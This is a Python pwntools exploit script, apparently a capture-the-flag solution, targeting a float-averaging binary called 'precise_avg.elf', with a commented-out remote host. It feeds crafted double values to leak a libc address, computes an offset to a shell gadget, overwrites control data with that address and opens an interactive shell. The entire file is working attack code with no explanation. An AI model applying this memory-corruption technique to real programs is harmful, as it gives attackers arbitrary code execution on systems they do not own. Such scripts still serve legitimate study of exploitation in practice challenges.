from pwn import *
def ud(i):
    import struct
    ret = "%.400f" % struct.unpack('<d',p64(i))[0]
    return ret
s=process("./precise_avg.elf")
#s=remote("82.196.10.106",12499)

#gdb.attach(s)
s.sendlineafter("values: ","39")
for i in range(33):
    s.sendline(str(1))
s.sendline(".")
s.sendline(".")
s.sendline("0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000207349618466348102033985643961573006020580007479120601431559126907588247093813390045")
s.sendline("0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000311040410723165117376682577942808795992266020903295475553467858058211267493380276321")

s.sendline("0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000207304411459753627975193487917025563765008604507181390715614185817639435284898165945")
s.sendline("0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000207324964590620623831431233178808881774098990994970146625814290182031463386000606629")

s.recvuntil(".")
s.recv(6)
leak=s.recv(8)
leak= hex(u64(leak))
leak=str(leak)[3:-2]

leak="0x"+leak

leak=int(leak,16)
base=leak-0x812f0
#print hex(leak)
system=base+0x4f2c5


#print leak

s.sendlineafter("values: ","36")
for i in range(33):
    s.sendline(str(1))
s.sendline(".")
s.sendline(".")
f=ud(system)
#print hex(system)
#print f
s.sendline(str(f))

#s.sendline("0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000207307178227370338955840876702265625804693848842076030934294969097461439067738879114")

s.interactive()
